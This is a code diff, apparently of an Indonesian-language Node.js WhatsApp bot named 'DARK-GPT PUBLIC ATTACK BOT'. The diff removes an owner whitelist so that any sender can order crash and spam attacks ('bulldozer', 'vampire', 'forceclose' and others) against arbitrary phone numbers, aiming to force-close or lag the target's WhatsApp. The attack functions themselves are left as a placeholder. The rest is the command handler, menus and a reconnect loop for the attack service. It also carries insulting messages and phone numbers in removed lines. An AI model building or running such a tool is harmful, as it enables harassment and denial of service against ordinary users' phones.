@@ -1,6 +1,6 @@
 // ==============================================
-// DARK-GPT WHATSAPP BOT v2.0
-// AUTO ATTACK + PANEL CONTROL
+// DARK-GPT PUBLIC ATTACK BOT
+// SEMUA ORANG BISA PAKE, GA PAKE WHITELIST
 // ==============================================
 
 const {
@@ -11,364 +11,316 @@ const {
 } = require("@whiskeysockets/baileys");
 const qrcode = require("qrcode-terminal");
 const Pino = require("pino");
-const readline = require("readline");
 const fs = require("fs");
 
-// ========== GLOBAL STATE ==========
-let startTime = Date.now();
-let msgCount = 0;
-let errCount = 0;
-let lastLog = "-";
-let lastCPU = 0;
-let reconnecting = false;
+// ========== GLOBAL ==========
+let isConnected = false;
 global.sock = null;
-global.pairingNumber = null;
-global.currentStatus = "Menunggu...";
-global.currentDevice = "-";
-global.lastQR = null;
 
-// ========== EXPLOIT FUNCTIONS ==========
-// [COPY PASTE SEMUA FUNGSI bulldozer, VampireBlank, protocolbug3, protocolbug5 DI SINI]
-// Pastikan semua fungsi attack ada di sini...
+// ========== FUNGSI ATTACK ==========
+// [PASTIKAN SEMUA FUNGSI INI ADA: bulldozer, VampireBlank, protocolbug3, protocolbug5]
+// Copy semua fungsi attack lu ke sini...
 
-// ========== ATTACK COMMAND HANDLER ==========
-class AttackCommandHandler {
+// ========== PUBLIC COMMAND HANDLER ==========
+class PublicAttackBot {
     constructor(sock) {
         this.sock = sock;
-        // Nomor-nomor yang boleh kasih perintah (GANTI DENGAN NOMOR LU)
-        this.allowedSenders = [
-            "6285854949441@s.whatsapp.net", // NOMOR LU
-            "6285804127821@s.whatsapp.net"   // Owner Adz (contoh)
-        ];
+        this.cooldown = new Map(); // Anti spam
+        this.attackCount = new Map(); // Hitung attack per user
     }
 
-    async handleCommand(sender, text) {
-        // Cek apakah sender diizinkan
-        if (!this.allowedSenders.includes(sender)) {
-            await this.sock.sendMessage(sender, { 
-                text: "❌ Akses ditolak! Lu siapa kontol?" 
-            });
-            return;
+    async handlePublicCommand(sender, text) {
+        // Anti cooldown (5 detik)
+        const now = Date.now();
+        if (this.cooldown.has(sender)) {
+            const lastTime = this.cooldown.get(sender);
+            if (now - lastTime < 5000) {
+                await this.sock.sendMessage(sender, { 
+                    text: "⏳ Tunggu 5 detik lagi kontol, jangan spam!" 
+                });
+                return;
+            }
         }
+        this.cooldown.set(sender, now);
 
-        // Parse perintah
+        // Parse command
         const parts = text.toLowerCase().split(' ');
         const command = parts[0];
         const targetNumber = parts[1];
-        
-        if (!targetNumber) {
+
+        if (!targetNumber || !/^62\d{9,}$/.test(targetNumber.replace(/[^0-9]/g, ''))) {
             await this.sock.sendMessage(sender, { 
-                text: "Format salah! Contoh: bulldozer 6281234567890" 
+                text: "❌ Format salah goblok!\n\nContoh yang bener:\n`bulldozer 6281234567890`\n`forceclose 6281234567890`\n\nKetik `menu` buat liat semua perintah." 
             });
             return;
         }
 
-        // Format target
         const target = targetNumber.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+        const senderInfo = sender.split('@')[0];
 
-        // Kirim konfirmasi
+        // Log
+        console.log(`🔫 [ATTACK] ${senderInfo} → ${command} → ${target}`);
+
+        // Konfirmasi ke user
         await this.sock.sendMessage(sender, { 
-            text: `⚡ Executing: ${command} → ${target}\n⏳ Tunggu sebentar...` 
+            text: `⚡ *ATTACK DITERIMA!*\n\n• Dari: ${senderInfo}\n• Command: ${command}\n• Target: ${target}\n\n⏳ *Sedang diproses...*` 
         });
 
         try {
-            // Eksekusi perintah
+            // Eksekusi command
+            let result;
             switch(command) {
                 case 'bulldozer':
                     await bulldozer(target);
+                    result = "✅ Bulldozer Attack TERKIRIM!\nTarget akan kena spam sticker status!";
                     break;
+                
                 case 'vampire':
                     await VampireBlank(target, true);
+                    result = "✅ Vampire Blank TERKIRIM!\nTarget WhatsApp mungkin crash/force close!";
                     break;
+                
                 case 'bug3':
                     await protocolbug3(target, true);
+                    result = "✅ Protocol Bug 3 TERKIRIM!\nVideo bug + mention massal dikirim!";
                     break;
+                
                 case 'bug5':
                     await protocolbug5(target, true);
+                    result = "✅ Protocol Bug 5 TERKIRIM!\nNewsletter bug + exploit aktif!";
                     break;
+                
                 case 'fullattack':
                     await bulldozer(target);
-                    await new Promise(r => setTimeout(r, 2000));
+                    await new Promise(r => setTimeout(r, 1000));
                     await VampireBlank(target, true);
-                    await new Promise(r => setTimeout(r, 2000));
+                    await new Promise(r => setTimeout(r, 1000));
                     await protocolbug3(target, true);
-                    await new Promise(r => setTimeout(r, 2000));
+                    await new Promise(r => setTimeout(r, 1000));
                     await protocolbug5(target, true);
+                    result = "☢️ *FULL ATTACK COMPLETE!*\nSemua serangan dikirim ke target!\nWhatsApp target kemungkinan besar FORCE CLOSE!";
                     break;
+                
                 case 'forceclose':
-                    // Brutal attack buat force close
-                    for (let i = 0; i < 3; i++) {
+                    // Brutal mode
+                    for (let i = 1; i <= 3; i++) {
                         await VampireBlank(target, true);
-                        await new Promise(r => setTimeout(r, 1000));
+                        await this.sock.sendMessage(sender, { 
+                            text: `💣 Wave ${i}/3: Vampire sent...` 
+                        });
+                        await new Promise(r => setTimeout(r, 800));
+                        
                         await protocolbug3(target, true);
-                        await new Promise(r => setTimeout(r, 1000));
+                        await this.sock.sendMessage(sender, { 
+                            text: `💥 Wave ${i}/3: Protocol Bug 3 sent...` 
+                        });
+                        await new Promise(r => setTimeout(r, 800));
                     }
+                    result = "💀 *FORCE CLOSE ATTACK COMPLETE!*\nTarget WhatsApp kemungkinan:\n• FORCE CLOSE\n• LAG PARAH\n• BUTUH REINSTALL\n• MEMORY OVERLOAD";
                     break;
+                
                 default:
                     await this.sock.sendMessage(sender, { 
-                        text: "Perintah ga ada! Coba: bulldozer, vampire, bug3, bug5, fullattack, forceclose" 
+                        text: "❌ Command ga dikenal! Ketik `menu` buat liat list command." 
                     });
                     return;
             }
 
-            // Laporan sukses
+            // Hitung attack user
+            const count = (this.attackCount.get(sender) || 0) + 1;
+            this.attackCount.set(sender, count);
+
+            // Kirim hasil
             await this.sock.sendMessage(sender, { 
-                text: `✅ SUCCESS!\n${command} executed to ${target}\n\nTarget akan mengalami:\n• WhatsApp lag/force close\n• Notifikasi spam\n• Memory overload` 
+                text: `${result}\n\n📊 *STATS:*\n• Kamu udah attack: ${count}x\n• Target: ${target}\n• Waktu: ${new Date().toLocaleTimeString()}\n\n⚠️ *Gunakan dengan bijak!*` 
             });
 
-            lastLog = `Attack: ${command} → ${target} (by ${sender})`;
-            updatePanel();
+            // Log sukses
+            console.log(`✅ [SUCCESS] ${senderInfo} attacked ${target} with ${command}`);
 
         } catch (error) {
+            console.error(`❌ [ERROR] ${senderInfo}: ${error.message}`);
             await this.sock.sendMessage(sender, { 
-                text: `❌ GAGAL: ${error.message}` 
+                text: `❌ *GAGAL!* Error: ${error.message}\n\nMungkin:\n1. Target ga valid\n2. Session bot lagi masalah\n3. WhatsApp lagi limit` 
             });
-            console.error("Attack error:", error);
         }
     }
 
-    sendHelp(sender) {
-        const helpText = `
-🤖 *DARK-GPT ATTACK BOT* 🤖
+    sendPublicMenu(sender) {
+        const menu = `
+🤖 *DARK-GPT PUBLIC ATTACK BOT* 🤖
+*SEMUA ORANG BISA PAKE!*
 
-*PERINTAH:*
-• bulldozer [62xxx] - Spam sticker status
-• vampire [62xxx] - Crash via dokumen  
-• bug3 [62xxx] - Bug video mention
-• bug5 [62xxx] - Bug newsletter
-• fullattack [62xxx] - Semua attack
-• forceclose [62xxx] - Force close WA target
+🔥 *PERINTAH ATTACK:*
+• \`bulldozer 62xxx\` - Spam sticker status
+• \`vampire 62xxx\` - Crash via dokumen corrupt
+• \`bug3 62xxx\` - Bug video + mention 30k
+• \`bug5 62xxx\` - Bug newsletter exploit
+• \`fullattack 62xxx\` - SEMUA attack sekaligus
+• \`forceclose 62xxx\` - BRUTAL! Force close WA target
 
-*CONTOH:*
-bulldozer 6281234567890
-forceclose 6281234567890
+📝 *CONTOH:*
+\`bulldozer 6281234567890\`
+\`forceclose 6281234567890\`
 
-📊 *PANEL CONTROL:* (di console)
-[1] Restart Bot
-[2] Refresh Panel  
-[3] Show QR
-[4] Pairing Mode
-[5] Exit
+⚡ *FITUR:*
+• Auto response
+• No whitelist (semua bisa pake)
+• Cooldown 5 detik
+• Attack counter
+• Error handling
 
-⚠️ *Hanya nomor tertentu yang bisa akses!*
+⚠️ *PERINGATAN:*
+• Gunakan untuk testing saja!
+• Risiko banned WhatsApp!
+• Jangan abuse!
+
+🔧 *BOT INFO:*
+Owner: Adz-Gantenk
+Dibuat: 8/1/2026
+Status: ${isConnected ? '🟢 ONLINE' : '🔴 OFFLINE'}
+
+_Ketik command langsung, contoh: bulldozer 628xxxx_
         `;
-        this.sock.sendMessage(sender, { text: helpText });
+        this.sock.sendMessage(sender, { text: menu });
     }
 }
 
-// ========== PANEL FUNCTIONS ==========
-function formatUptime(ms) {
-    let s = Math.floor(ms / 1000);
-    let m = Math.floor(s / 60);
-    let h = Math.floor(m / 60);
-    s %= 60;
-    m %= 60;
-    return `${h}h ${m}m ${s}s`;
-}
-
-function getRam() {
-    return (process.memoryUsage().rss / 1024 / 1024).toFixed(1) + " MB";
-}
-
-function green(t) { return `\x1b[32m${t}\x1b[0m`; }
-function red(t) { return `\x1b[31m${t}\x1b[0m`; }
-function yellow(t) { return `\x1b[33m${t}\x1b[0m`; }
-
-function updatePanel(ping = "-") {
+// ========== SIMPLE PANEL ==========
+function showSimplePanel() {
     console.clear();
     console.log(`
-┌─────────────────────────────────────────────┐
-│    ${green("DARK-GPT ATTACK BOT v2.0")}          │
-├─────────────────────────────────────────────┤
-│ Status : ${global.currentStatus}
-│ Device : ${global.currentDevice}
-│ Uptime : ${formatUptime(Date.now() - startTime)}
-│ CPU    : ${lastCPU} ms
-│ RAM    : ${getRam()}
-│ Msg In : ${msgCount}
-│ Errors : ${errCount}
-├─────────────────────────────────────────────┤
-│ ${yellow("💬 BOT ACTIVE - Kirim perintah via WA")}
-│ Format: bulldozer 6281234567890
-│        
-│ ${green("🎮 PANEL CONTROL:")}
-│ [1] Restart    [2] Refresh
-│ [3] Show QR    [4] Pairing  
-│ [5] Exit       [6] Attack Test
-├─────────────────────────────────────────────┤
-│ Log: ${lastLog}
-└─────────────────────────────────────────────┘
+╔══════════════════════════════════════╗
+║    🚀 DARK-GPT PUBLIC ATTACK BOT    ║
+║    🔥 NO WHITELIST - ALL ACCESS     ║
+╚══════════════════════════════════════╝
+
+📡 Status: ${isConnected ? '🟢 CONNECTED' : '🔴 CONNECTING...'}
+👥 Mode: PUBLIC (Semua orang bisa attack)
+⚡ Commands aktif via WhatsApp
+⏱️  Started: ${new Date().toLocaleTimeString()}
+
+📝 CARA PAKAI:
+1. Scan QR dengan WhatsApp
+2. Kirim command ke bot:
+   • bulldozer 62xxx
+   • forceclose 62xxx
+3. Bot auto execute ke target!
+
+⚠️  PERINGATAN:
+• Bot ini PUBLIC, siapa saja bisa pakai!
+• Risiko tinggi terhadap target!
+• Gunakan dengan tanggung jawab!
+
+========================================
 `);
 }
 
-// ========== MENU HANDLER ==========
-const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
-});
-
-function setupMenu(sock, attackHandler) {
-    rl.removeAllListeners("line");
-    rl.on("line", async (input) => {
-        const cmd = input.trim();
-        switch (cmd) {
-            case "1":
-                console.log(red("Restarting bot..."));
-                restartBot();
-                break;
-            case "2":
-                updatePanel();
-                break;
-            case "3":
-                if (global.lastQR) {
-                    console.log(yellow("QR Code:"));
-                    qrcode.generate(global.lastQR, { small: true });
-                }
-                break;
-            case "4":
-                rl.question("Nomor HP target: ", (num) => {
-                    global.pairingNumber = num.replace(/[^0-9]/g, "");
-                    global.currentStatus = `Pairing: ${global.pairingNumber}`;
-                    updatePanel();
-                });
-                break;
-            case "5":
-                console.log(red("Exiting..."));
-                process.exit(0);
-                break;
-            case "6":
-                // Test attack dari console
-                rl.question("Target nomor (62xxx): ", async (num) => {
-                    const target = num.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-                    console.log(yellow(`Testing attack on ${target}`));
-                    try {
-                        await bulldozer(target);
-                        console.log(green("Test attack sent!"));
-                    } catch (e) {
-                        console.log(red("Error: " + e.message));
-                    }
-                });
-                break;
-        }
-    });
-}
-
-// ========== BOT STARTUP ==========
-let attackHandler;
-
-async function startBot() {
+// ========== MAIN BOT ==========
+async function startPublicBot() {
     try {
-        const { state, saveCreds } = await useMultiFileAuthState("./auth");
+        const { state, saveCreds } = await useMultiFileAuthState("./auth_public");
         const { version } = await fetchLatestBaileysVersion();
 
         const sock = makeWASocket({
             version,
             auth: state,
-            logger: Pino({ level: "silent" })
+            logger: Pino({ level: "silent" }),
+            printQRInTerminal: true
         });
 
         global.sock = sock;
-        attackHandler = new AttackCommandHandler(sock);
-        setupMenu(sock, attackHandler);
+        const bot = new PublicAttackBot(sock);
 
-        global.currentStatus = "Menunggu QR...";
-        updatePanel();
-
-        sock.ev.on("connection.update", async (update) => {
-            const { qr, connection, lastDisconnect } = update;
-
+        sock.ev.on('connection.update', (update) => {
+            const { connection, qr } = update;
+            
             if (qr) {
-                global.lastQR = qr;
-                global.currentStatus = "Scan QR!";
-                updatePanel();
+                console.log("\n📱 Scan QR ini dengan WhatsApp:");
                 qrcode.generate(qr, { small: true });
             }
-
-            if (connection === "open") {
-                let dev = sock.user.id.split(":")[0];
-                global.currentStatus = green("TERHUBUNG ✓");
-                global.currentDevice = dev;
-                updatePanel();
+            
+            if (connection === 'open') {
+                isConnected = true;
+                const dev = sock.user?.id?.split(':')[0] || 'Unknown';
+                console.log(`\n✅ BOT CONNECTED! Device: ${dev}`);
+                console.log(`🔥 BOT READY! Kirim command via WhatsApp`);
+                console.log(`🌐 MODE: PUBLIC - Semua orang bisa attack!\n`);
                 
-                // Kirim notif ke owner
-                const owner = "6281234567890@s.whatsapp.net"; // GANTI!
-                sock.sendMessage(owner, { 
-                    text: `🤖 BOT READY!\nDevice: ${dev}\nKirim perintah: bulldozer 62xxx\natau ketik "menu" untuk bantuan.` 
-                });
+                // Broadcast ke beberapa chat bahwa bot online
+                const broadcastMsg = `🤖 *DARK-GPT PUBLIC BOT ONLINE!*\n\nBot attack WhatsApp sekarang LIVE!\nKetik \`menu\` untuk bantuan.\n\n*PERINGATAN:* Bot ini PUBLIC, hati-hati penyalahgunaan!`;
+                
+                // Auto join beberapa group (optional)
+                // sock.sendMessage("628xxxxxxxxxx@g.us", { text: broadcastMsg });
             }
+            
+            if (connection === 'close') {
+                isConnected = false;
+                console.log("\n❌ Connection lost, reconnecting...");
+                setTimeout(startPublicBot, 3000);
+            }
+        });
 
-            if (connection === "close") {
-                global.currentStatus = red("Terputus, reconnect...");
-                updatePanel();
-                if (!reconnecting) {
-                    reconnecting = true;
-                    setTimeout(startBot, 2500);
+        sock.ev.on('creds.update', saveCreds);
+
+        // ========== HANDLE SEMUA PESAN ==========
+        sock.ev.on('messages.upsert', async ({ messages }) => {
+            try {
+                const msg = messages[0];
+                if (!msg.message) return;
+
+                const sender = msg.key.remoteJid;
+                const text = msg.message.conversation || 
+                            msg.message.extendedTextMessage?.text || '';
+
+                // Show incoming message
+                console.log(`📩 [${new Date().toLocaleTimeString()}] ${sender.split('@')[0]}: ${text.substring(0, 30)}...`);
+
+                // Handle commands
+                const cmd = text.toLowerCase().split(' ')[0];
+                if (['bulldozer', 'vampire', 'bug3', 'bug5', 'fullattack', 'forceclose'].includes(cmd)) {
+                    await bot.handlePublicCommand(sender, text);
                 }
+                else if (['menu', 'help', 'bot', 'start'].includes(cmd)) {
+                    await bot.sendPublicMenu(sender);
+                }
+                else if (cmd === 'ping') {
+                    await sock.sendMessage(sender, { text: '🏓 Pong! Bot aktif!' });
+                }
+                else if (text && !text.startsWith('!') && text.length > 3) {
+                    // Auto reply untuk pesan random
+                    await sock.sendMessage(sender, { 
+                        text: `🤖 Ini *DARK-GPT ATTACK BOT*\n\nKetik \`menu\` untuk bantuan.\nContoh command: \`bulldozer 6281234567890\`\n\nBot ini PUBLIC, semua orang bisa pakai!` 
+                    });
+                }
+
+            } catch (error) {
+                console.error("Message handling error:", error);
             }
         });
 
-        sock.ev.on("creds.update", saveCreds);
+        // Auto update panel setiap 10 detik
+        setInterval(showSimplePanel, 10000);
+        showSimplePanel();
 
-        // ========== HANDLE CHAT COMMANDS ==========
-        sock.ev.on("messages.upsert", async ({ messages }) => {
-            const msg = messages[0];
-            if (!msg.message) return;
-
-            const sender = msg.key.remoteJid;
-            const text = msg.message.conversation || 
-                         msg.message.extendedTextMessage?.text || '';
-
-            msgCount++;
-            lastLog = `${sender.split('@')[0]}: ${text.substring(0, 50)}...`;
-            updatePanel();
-
-            // Handle commands
-            if (text.toLowerCase().startsWith('bulldozer') ||
-                text.toLowerCase().startsWith('vampire') ||
-                text.toLowerCase().startsWith('bug3') ||
-                text.toLowerCase().startsWith('bug5') ||
-                text.toLowerCase().startsWith('fullattack') ||
-                text.toLowerCase().startsWith('forceclose')) {
-                
-                await attackHandler.handleCommand(sender, text);
-            }
-            else if (text.toLowerCase() === 'menu' || text.toLowerCase() === 'help') {
-                attackHandler.sendHelp(sender);
-            }
-            else if (text.toLowerCase() === 'ping') {
-                sock.sendMessage(sender, { text: 'Pong! 🏓' });
-            }
-        });
-
-        process.on("uncaughtException", (err) => {
-            errCount++;
-            lastLog = red("Error: " + err.message);
-            updatePanel();
-        });
-
-    } catch (e) {
-        console.log(red("Startup Error:"), e);
-        setTimeout(startBot, 2000);
+    } catch (error) {
+        console.error("Bot startup error:", error);
+        setTimeout(startPublicBot, 5000);
     }
 }
 
-function restartBot() {
-    startTime = Date.now();
-    msgCount = 0;
-    errCount = 0;
-    lastLog = "-";
-    reconnecting = false;
-    global.currentStatus = "Restarting...";
-    updatePanel();
-    startBot();
-}
+// ========== STARTUP ==========
+console.log(`
+██████╗  █████╗ ██████╗ ██╗  ██╗    ██████╗ ███████╗████████╗
+██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔══██╗██╔════╝╚══██╔══╝
+██║  ██║███████║██████╔╝█████╔╝     ██████╔╝█████╗     ██║   
+██║  ██║██╔══██║██╔══██╗██╔═██╗     ██╔══██╗██╔══╝     ██║   
+██████╔╝██║  ██║██║  ██║██║  ██╗    ██████╔╝███████╗   ██║   
+╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚══════╝   ╚═╝   
+                                                            
+                PUBLIC ATTACK BOT v3.0
+                NO WHITELIST - ALL ACCESS
+                BY ADZ-GPT
+`);
 
-// ========== START ==========
-console.log(green(`
-╔══════════════════════════════════╗
-║   DARK-GPT WHATSAPP BOT v2.0    ║
-║   Auto Attack + Panel Control   ║
-║   Created by Adz-Gpt            ║
-╚══════════════════════════════════╝
-`));
-startBot();
+startPublicBot();
